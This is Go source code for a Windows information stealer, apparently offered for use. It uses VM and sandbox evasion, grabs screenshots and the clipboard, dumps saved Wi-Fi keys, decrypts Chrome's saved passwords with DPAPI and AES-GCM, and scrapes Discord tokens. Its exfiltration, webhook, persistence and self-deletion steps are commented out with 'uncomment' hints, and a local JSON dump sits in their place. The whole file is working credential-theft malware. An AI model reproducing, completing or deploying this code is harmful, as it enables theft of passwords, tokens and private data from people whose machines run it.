func isVMOrSandbox() bool {
	if runtime.NumCPU() < 4 {
		return true
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
	var totalMemKB uint64
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&totalMemKB)))
	if ret == 0 || totalMemKB < 4*1024*1024 { // < 4GB
		return true
	}
	return false
}

func takeScreenshot() string {
	n := screenshot.NumActiveDisplays()
	var buf bytes.Buffer
	for i := 0; i < n; i++ {
		img, err := screenshot.CaptureDisplay(i)
		if err != nil {
			continue
		}
		png.Encode(&buf, img)
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func getClipboard() string {
	cmd := exec.Command("powershell", "-Command", "Get-Clipboard -Raw")
	out, _ := cmd.Output()
	return strings.TrimSpace(string(out))
}

func getHostname() string {
	h, _ := os.Hostname()
	return h
}

func grabWiFi() []map[string]string {
	var wifis []map[string]string
	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
	if err != nil {
		return wifis
	}
	profiles := regexp.MustCompile(`All User Profile\s*:\s*(.*)`).FindAllStringSubmatch(string(out), -1)
	for _, p := range profiles {
		name := strings.TrimSpace(p[1])
		out2, err := exec.Command("netsh", "wlan", "show", "profile", name, "key=clear").Output()
		if err != nil {
			continue
		}
		keyMatch := regexp.MustCompile(`Key Content\s*:\s*(.*)`).FindStringSubmatch(string(out2))
		if len(keyMatch) > 1 {
			wifis = append(wifis, map[string]string{
				"ssid": name,
				"pass": strings.TrimSpace(keyMatch[1]),
			})
		}
	}
	return wifis
}

func grabChromePasswords() []map[string]string {
	var creds []map[string]string
	appData := os.Getenv("LOCALAPPDATA")
	localStatePath := filepath.Join(appData, "Google", "Chrome", "User Data", "Local State")
	loginDBPath := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Login Data")

	// Read master key from Local State
	stateData, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return creds
	}
	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err = json.Unmarshal(stateData, &state); err != nil {
		return creds
	}
	encKeyB64 := state.OsCrypt.EncryptedKey
	encKey, _ := base64.StdEncoding.DecodeString(encKeyB64)
	if len(encKey) <= 5 || string(encKey[:5]) != "DPAPI" {
		return creds
	}
	encKey = encKey[5:] // strip DPAPI prefix

	// DPAPI decrypt master key
	inBlob := windows.DataBlob{
		Size: uint32(len(encKey)),
		Data: &encKey[0],
	}
	var outBlob *windows.DataBlob
	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return creds
	}
	defer windows.LocalFree(uintptr(unsafe.Pointer(outBlob)))
	masterKey := unsafe.Slice(outBlob.Data, outBlob.Size)

	// Copy locked Login Data DB to temp
	tempDB := loginDBPath + ".tmp"
	dbData, _ := ioutil.ReadFile(loginDBPath)
	if err := ioutil.WriteFile(tempDB, dbData, 0644); err != nil {
		return creds
	}
	defer os.Remove(tempDB)

	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return creds
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return creds
	}
	defer rows.Close()

	for rows.Next() {
		var url, user string
		var encPass []byte
		rows.Scan(&url, &user, &encPass)

		if len(encPass) < 15 || string(encPass[:3]) != "v10" && string(encPass[:3]) != "v11" {
			continue
		}

		nonce := encPass[3:15]
		ciphertext := encPass[15 : len(encPass)-16]
		tag := encPass[len(encPass)-16:]

		block, _ := aes.NewCipher(masterKey)
		aesgcm, _ := cipher.NewGCMWithNonceSize(block, 12)
		plain, err := aesgcm.Open(nil, nonce, append(ciphertext, tag...), nil)
		if err != nil {
			continue
		}

		creds = append(creds, map[string]string{
			"url":      url,
			"username": user,
			"password": string(plain),
		})
	}
	return creds
}

func grabDiscordTokens() []string {
	var tokens []string
	appData := os.Getenv("APPDATA")
	paths := []string{"discord", "discordcanary", "discordptb"}
	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, p := range paths {
		leveldb := filepath.Join(appData, p, "Local Storage", "leveldb")
		if _, err := os.Stat(leveldb); os.IsNotExist(err) {
			continue
		}
		filepath.Walk(leveldb, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log") {
				data, _ := ioutil.ReadFile(path)
				matches := re.FindAllString(string(data), -1)
				tokens = append(tokens, matches...)
			}
			return nil
		})
	}

	seen := make(map[string]bool)
	unique := []string{}
	for _, t := range tokens {
		if !seen[t] {
			seen[t] = true
			unique = append(unique, t)
		}
	}
	return unique
}

func main() {
	if isVMOrSandbox() {
		os.Exit(0)
	}

	// addPersistence()  // Uncomment and add your persistence code
	info := map[string]interface{}{
		"hostname":   getHostname(),
		"screenshot": takeScreenshot(),
		"clipboard":  getClipboard(),
		"wifi":       grabWiFi(),
	}

	creds := map[string]interface{}{
		"browser_passwords": grabChromePasswords(),
		"discord_tokens":    grabDiscordTokens(),
	}

	full := map[string]interface{}{
		"info":  info,
		"creds": creds,
		"time":  time.Now().UTC().String(),
	}

	jsonData, _ := json.Marshal(full)

	// hooks := getWebhooks(key)  // Uncomment your webhook logic
	// go exfil(jsonData, hooks)
	// selfDelete()

	// Temp debug output instead of exfil
	ioutil.WriteFile("dump.json", jsonData, 0644)

	for {
		time.Sleep(24 * time.Hour)
	}
}
